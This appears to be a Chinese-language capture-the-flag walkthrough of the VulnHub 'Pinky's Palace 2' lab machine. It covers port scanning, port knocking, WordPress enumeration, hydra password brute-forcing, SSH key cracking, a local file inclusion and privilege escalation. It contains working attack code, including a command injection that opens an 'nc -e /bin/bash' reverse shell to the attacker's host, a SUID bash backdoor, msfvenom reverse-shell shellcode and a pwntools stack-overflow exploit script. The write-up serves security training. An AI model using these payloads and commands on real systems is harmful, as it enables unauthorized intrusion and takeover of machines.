## port scan

```shell
# Nmap 7.94SVN scan initiated Sun Nov 17 00:24:08 2024 as: nmap -sT --min-rate 8000 -p- -oN nmap_results/port 192.168.27.9
Nmap scan report for 192.168.27.9
Host is up (0.00020s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:71:DA:4C (VMware)
```

```shell
# Nmap 7.94SVN scan initiated Sun Nov 17 00:25:10 2024 as: nmap -sT -sV -sC -O -p80,4655,7654,31337 -oN nmap_results/detils 192.168.27.9
Nmap scan report for 192.168.27.9
Host is up (0.0013s latency).

PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:71:DA:4C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

vuln scan

```shell
# Nmap 7.94SVN scan initiated Sun Nov 17 00:26:02 2024 as: nmap --script=vuln -p80,4655,7654,31337 -oN nmap_results/vuln 192.168.27.9
Nmap scan report for 192.168.27.9
Host is up (0.00091s latency).

PORT      STATE    SERVICE
80/tcp    open     http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.27.9
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.27.9:80/
|     Form id: search-form-67397e7aa1d2c
|_    Form action: http://pinkydb/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.9.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /secret/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
```

```
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
```

全是被过滤状态，先看80端口

## web

根据靶机的描述，添加host解析记录

```shell
echo 192.168.27.9 pinkydb | sudo tee -a /etc/hosts
```

`wordpress 4.9.4`

使用wpscan扫描

枚举用户

```shell
wpscan --url http://pinkydb/ -e u
```

```shell
[+] pinky1337
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

有一个`pinky1337`用户

目录扫描

```shell
dirsearch -u http://pinkydb/
```

```text
301     0B   http://pinkydb/index.php    -> REDIRECTS TO: http://pinkydb/
301     0B   http://pinkydb/index.php/login/    -> REDIRECTS TO: http://pinkydb/login/
200     7KB  http://pinkydb/license.txt
200     3KB  http://pinkydb/readme.html
301   303B   http://pinkydb/secret    -> REDIRECTS TO: http://pinkydb/secret/
200   449B   http://pinkydb/secret/
302     0B   http://pinkydb/wordpress/    -> REDIRECTS TO: http://pinkydb/wordpress/wp-admin/setup-config.php
301   305B   http://pinkydb/wp-admin    -> REDIRECTS TO: http://pinkydb/wp-admin/
302     0B   http://pinkydb/wordpress/wp-login.php    -> REDIRECTS TO: http://pinkydb/wordpress/wp-admin/setup-config.php
400     1B   http://pinkydb/wp-admin/admin-ajax.php
302     0B   http://pinkydb/wp-admin/    -> REDIRECTS TO: http://pinkydb/wp-login.php
500     3KB  http://pinkydb/wp-admin/setup-config.php
200     0B   http://pinkydb/wp-config.php
200   528B   http://pinkydb/wp-admin/install.php
301   307B   http://pinkydb/wp-content    -> REDIRECTS TO: http://pinkydb/wp-content/
200     0B   http://pinkydb/wp-content/
200    84B   http://pinkydb/wp-content/plugins/akismet/akismet.php
500     0B   http://pinkydb/wp-content/plugins/hello.php
301   308B   http://pinkydb/wp-includes    -> REDIRECTS TO: http://pinkydb/wp-includes/
500     0B   http://pinkydb/wp-includes/rss-functions.php
200     0B   http://pinkydb/wp-cron.php
200     1KB  http://pinkydb/wp-login.php
302     0B   http://pinkydb/wp-signup.php    -> REDIRECTS TO: http://pinkydb/wp-login.php
405    42B   http://pinkydb/xmlrpc.php
200     3KB  http://pinkydb/wp-includes/
```

`secret`目录存在文件

http://pinkydb/secret/bambam.txt

```
8890
7000
666

pinkydb
```

像是三个端口和一个用户名，将用户名记录下

结合三个端口都是关闭状态，猜测需要敲门开启服务

使用`knock`工具，经过尝试，发现`7000 666 8890`顺序可以成功

```shell
┌──(root㉿kali)-[~/vulnhub/Pinkys-Palace2]
└─# knock -v 192.168.27.9 7000 666 8890 
hitting tcp 192.168.27.9:7000
hitting tcp 192.168.27.9:666
hitting tcp 192.168.27.9:8890
```

也可以写一个脚本，`knockd.txt`是端口序列

```shell
#!/bin/bash
while read -r line
do
echo '---------------'
knock -v 192.168.27.9 $line
done < knockd.txt
```

```text
8890 7000 666
8890 666 7000
7000 8890 666
7000 666 8890
666 8890 7000
666 7000 8890
```

再次进行扫描

```shell
# Nmap 7.94SVN scan initiated Tue Nov 19 23:40:43 2024 as: nmap -T3 -sT -sV -sC -O -p4655,7654,31337 -oN nmap_results/detil pinkydb
Nmap scan report for pinkydb (192.168.27.9)
Host is up (0.00072s latency).

PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    nginx 1.10.3
|_http-title: Pinkys Database
|_http-server-header: nginx/1.10.3
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   HTTPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / HTTP/1.0
|   Help: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HELP
|   RTSPRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / RTSP/1.0
|   SIPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
MAC Address: 00:0C:29:71:DA:4C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

端口现在是开放状态，`4655`端口是SSH服务，`7654`是HTTP服务

访问7654端口

![image-20241120130447791](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120130447791.png)

进行爆破，用户名有两个`pinky`和`pinkdb`

利用`cewl`工具生成社工字典

```shell
cewl http://pinkydb/ -w pass.txt
```

利用john的内置的密码生成规则，生成一个新字典

```shell
john --rules --wordlist=pass.txt --stdout | tee wordlist.txt
```

hydra进行爆破

```shell
hydra -L user_list -P pass.txt pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username"
```

![image-20241120141259190](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120141259190.png)

```
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
```

成功登录后台

http://pinkydb:7654/credentialsdir1425364865/notes.txt

> - Stefano
> - Intern Web developer
> - Created RSA key for security for him to login

还有一个私钥文件

私钥文件被加密了，进行爆破

```
ssh2john id_rsa > ssh_hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash
```

`id_rsa:secretz101`，成功爆破密码，SSH登录成功

## 提权

存在两个文件

```shell
stefano@Pinkys-Palace:~/tools$ cat note.txt 
Pinky made me this program so I can easily send messages to him.
stefano@Pinkys-Palace:~/tools$ file qsub 
qsub: setuid executable, regular file, no read permission
```

`qsub`是一个发信息的可执行文件，没有读权限

```shell
stefano@Pinkys-Palace:~/tools$ ls -la
total 28
drwxr-xr-x 2 stefano stefano   4096 Mar 17  2018 .
drwxr-xr-x 4 stefano stefano   4096 Mar 17  2018 ..
-rw-r--r-- 1 stefano stefano     65 Mar 16  2018 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub
```

www-data组可以读，返回web端

这里有文件包含漏洞

> http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub

![image-20241120142215403](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120142215403.png)

wget下来，ida分析

![image-20241120142526086](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120142526086.png)

密码就是环境变量`TERM`的值

```shell
stefano@Pinkys-Palace:~/tools$ echo $TERM
xterm-256color
stefano@Pinkys-Palace:~/tools$ ./qsub id
[+] Input Password: xterm-256color
[+] Welcome to Question Submit!
```

接着查看最后的`send`函数

![image-20241120142842484](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120142842484.png)

将发送的信息追加写入txt文件

利用分号执行多条命令即可

```shell
./qsub ';(nc -e /bin/bash 192.168.27.3 1234)'
```

成功反弹shell

> python -c 'import pty; pty.spawn("/bin/bash")'
>
> newgrp切换到默认组

```shell
pinky@Pinkys-Palace:~/tools$ id
id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
pinky@Pinkys-Palace:~/tools$ newgrp
newgrp
pinky@Pinkys-Palace:~/tools$ id
id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),1002(stefano)
```

进入到`pinky`家目录，查看bash历史命令

```shell
pinky@Pinkys-Palace:/home/pinky$ cat .bash_history
cat .bash_history
ls -al
cd
ls -al
cd /usr/local/bin
ls -al
vim backup.sh 
su demon
```

```shell
pinky@Pinkys-Palace:~/tools$ cd /usr/local/bin
cd /usr/local/bin
pinky@Pinkys-Palace:/usr/local/bin$ ls
ls
backup.sh
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
cat backup.sh
cat: backup.sh: Permission denied
pinky@Pinkys-Palace:/usr/local/bin$ ls -la
ls -la                              
total 12                                                                             
drwxrwsr-x  2 root  staff 4096 Mar 17  2018 .
drwxrwsr-x 10 root  staff 4096 Mar 17  2018 ..
-rwxrwx---  1 demon pinky  181 Nov 16 23:44 backup.sh
pinky@Pinkys-Palace:/usr/local/bin$ newgrp                              
newgrp
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
cat backup.sh
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
```

猜测是一个定时备份任务，尝试写入反弹shell

```
cp /bin/bash /tmp/tmp;chmod ugo+x /tmp/tmp;chmod u+s /tmp/tmp
```

```shell
pinky@Pinkys-Palace:/tmp$ ./tmp -p
./tmp -p
tmp-4.4$ id
id
uid=1000(pinky) gid=1000(pinky) euid=1001(demon) groups=1000(pinky),1002(stefano)
```

查找root的进程

```shell
tmp-4.4$ ps -aux | grep root
root        451  0.0  0.0   4040   992 ?        Ss   20:39   0:00 /daemon/panel
```

利用root权限运行的panel程序（ELF 64-bit）栈溢出漏洞进行提权

### shellcode构造、生成

```
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.27.3 LPORT=3344 -b '\x00' -f python -o shellcode
```

```shell
──(root㉿kali)-[~/vulnhub/Pinkys-Palace2]
└─# cat shellcode                                      
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x4b\xda\x32\x32\xb8"
buf += b"\xe2\x1c\x0a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x21\xf3\x6a\xab\xd2\xe0\x43\x60\x4a"
buf += b"\x84\x3d\x37\xf0\x75\x54\xb3\x49\xda\x3f\x22\x78"
buf += b"\x4a\x07\x09\x1a\x92\xbb\xd4\xd2\xf2\x46\x60\x61"
buf += b"\x82\x3d\x37\xd2\xe1\x42\x42\xb4\x14\x58\x13\xe0"
buf += b"\xed\x19\x7f\xbd\xb0\x09\x6a\x21\xaa\xa7\x25\x29"
buf += b"\xb3\x5c\x1d\xcb\x8a\x1c\x59\x03\x53\xd5\x60\xef"
buf += b"\xaa\x95\xec\x44\xdf\x32\x32\xb8\xe2\x1c\x0a"
```

最后结果：拼接 [\x90] 和 [\xfb\x0c\x40\x00]

python脚本

```shell
from pwn import *

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xea\xc6\x79\x25\x55"
buf += b"\x6f\x84\x50\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x80\xef\x21\xbc\x3f\x6d\xdb\x3a\xeb"
buf += b"\x98\x76\x20\x1d\xf8\xcc\xe9\xe8\xc6\x74\x35\x95"
buf += b"\xc7\x9f\x53\xbb\x8e\xf0\xc3\x3f\x7f\xde\x3a\xc0"
buf += b"\x9e\x76\x20\x3f\x6c\xda\x18\x15\x08\x13\x04\x0d"
buf += b"\x60\x81\x25\x1c\xac\x42\x7d\xcc\x27\x3f\x7f\x88"
buf += b"\xaf\x17\x0a\x26\x07\x84\x03\xa2\x4f\x9e\x77\x02"
buf += b"\x27\x0d\xb6\xe5\xc3\x79\x25\x55\x6f\x84\x50\x90"

ret = p64(0x400cfb)
#ret = "\xfb\x0c\x40\x00"
print (ret)
payload = buf + ret

r = remote("192.168.27.9", 31337)
r.recv()
r.send(payload)
print("ok")
```

![image-20241120150824146](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241120150824146.png)

```shell
root@Pinkys-Palace:/root# cat root.txt
cat root.txt

 ____  _       _          _
|  _ \(_)_ __ | | ___   _( )___
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/
 ____       _
|  _ \ __ _| | __ _  ___ ___
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
```

